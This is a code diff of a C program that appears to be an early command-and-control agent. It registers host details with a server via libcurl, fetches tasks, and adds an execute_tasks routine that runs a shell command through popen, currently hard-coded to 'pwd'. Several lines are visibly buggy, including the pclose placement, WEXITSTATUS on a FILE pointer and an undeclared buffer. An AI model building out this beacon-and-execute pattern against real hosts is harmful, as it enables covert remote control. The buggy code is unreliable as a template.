@@ -7,9 +7,10 @@
 #include <errno.h>
 #include<sys/utsname.h>
 #include "initiate.h"
-#include "utils.h"
 
 //ref https://curl.se/libcurl/c/postit2.html
+
+static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);
 
 bool reg(void)
 {
@@ -32,6 +33,7 @@ bool reg(void)
 		return false;
 
 	} else {
+
 
 		/* Create the form */
 		// returns null if failure.
@@ -77,6 +79,16 @@ bool reg(void)
 
 		curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
+		struct response chunk = {.memory = malloc(0), .size = 0};
+
+		// Send data to this function as opposed to writing to stdout.
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, mem_cb);
+
+		// Pass chunk to callback function.
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
+
+  		printf("The data returning from the function is %s\n", chunk.memory);
+
 		// Perform the request, res will get the return code
 		res = curl_easy_perform(curl);
 
@@ -90,6 +102,8 @@ bool reg(void)
 		// Always cleanup.
 		curl_easy_cleanup(curl);
 
+		free(chunk.memory);
+
 		// Then cleanup the form.
 		curl_mime_free(form);
 
@@ -98,6 +112,30 @@ bool reg(void)
 
 		return true;
 	}
+}
+
+// Takes write_function output and stores it in memory.
+// Ref: https://everything.curl.dev/libcurl/callbacks/write
+static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
+{
+  size_t realsize = size * nmemb;
+  struct response *mem = (struct response *)userp;
+
+  char *ptr = realloc(mem->memory, mem->size + realsize + 1);
+  if(!ptr) {
+    /* out of memory! */
+    printf("not enough memory (realloc returned NULL)\n");
+    return 0;
+  }
+
+  mem->memory = ptr;
+  memcpy(&(mem->memory[mem->size]), contents, realsize);
+  mem->size += realsize;
+  mem->memory[mem->size] = 0;
+
+//   printf("The data in the function is %s\n\n", mem->memory);
+
+  return realsize;
 }
 
 // This function is used to reduce the amounts of curl_mime_addpart,
@@ -183,8 +221,11 @@ bool check_tasks(void)
 // }
 
 // The base of this code is in the "got_data" function in js_libcurl.c
-char *get_tasks(char *buffer, size_t itemsize, size_t nitems, void *ignorethis)
+size_t get_tasks(char *buffer, size_t itemsize, size_t nitems, void *ignorethis)
 {
+	// Cast to void to get rid of compiler warnings.
+	(void)ignorethis;
+
 	// This computes the number of bytes that was received in the response body.
 	size_t bytes = itemsize * nitems;
 	int linenumber = 1;
@@ -192,7 +233,7 @@ char *get_tasks(char *buffer, size_t itemsize, size_t nitems, void *ignorethis)
 	printf("New chunk(%zu)\n", bytes);
 	printf("%d:\t", linenumber);
 
-	for (int i = 0; i < bytes; i++) {
+	for (size_t i = 0; i < bytes; i++) {
 		printf("%c", buffer[i]);
 		if (buffer[i] == '\n') {
 			linenumber++;
@@ -203,6 +244,69 @@ char *get_tasks(char *buffer, size_t itemsize, size_t nitems, void *ignorethis)
 	// This adds some separation between each chunk of data.
 	printf("\n\n");
 	return bytes;
+}
+
+void execute_tasks(void)
+{
+	const char *cmd = "pwd";
+	FILE *cmd_results = NULL;
+	int cmd_ret = 0;
+
+	if(!can_run_command(cmd)) {
+		puts("Command does not exist\n");
+	} else {
+		puts("Command exists\n");
+		if ((cmd_results = popen(cmd, "r")) != NULL) {
+			while (fgets(buf, BUFSIZ, cmd_results) != NULL) {
+				(void) printf("%s", buf);
+				cmd_ret = pclose(cmd_results);
+				printf("The exit status is: %d\n", WEXITSTATUS(cmd_results));
+			}
+
+		}
+
+	}
+}
+
+// Checks to see if a command exits on host.
+// Ref: https://stackoverflow.com/questions/41230547/check-if-program-is-
+// installed-in-c
+bool can_run_command(const char *cmd) 
+{
+    if(strchr(cmd, '/')) {
+        // if cmd includes a slash, no path search must be performed,
+        // go straight to checking if it's executable
+        return access(cmd, X_OK)==0;
+    }
+    const char *path = getenv("PATH");
+    if(!path) return false; // something is horribly wrong...
+    // we are sure we won't need a buffer any longer
+    char *buf = malloc(strlen(path)+strlen(cmd)+3);
+    if(!buf) return false; // actually useless, see comment
+    // loop as long as we have stuff to examine in path
+    for(; *path; ++path) {
+        // start from the beginning of the buffer
+        char *p = buf;
+        // copy in buf the current path element
+        for(; *path && *path!=':'; ++path,++p) {
+            *p = *path;
+        }
+        // empty path entries are treated like "."
+        if(p==buf) *p++='.';
+        // slash and command name
+        if(p[-1]!='/') *p++='/';
+        strcpy(p, cmd);
+        // check if we can execute it
+        if(access(buf, X_OK)==0) {
+            free(buf);
+            return true;
+        }
+        // quit at last cycle
+        if(!*path) break;
+    }
+    // not found
+    free(buf);
+    return false;
 }
 
 // // The base of this code is in the "got_data" function in js_libcurl.c
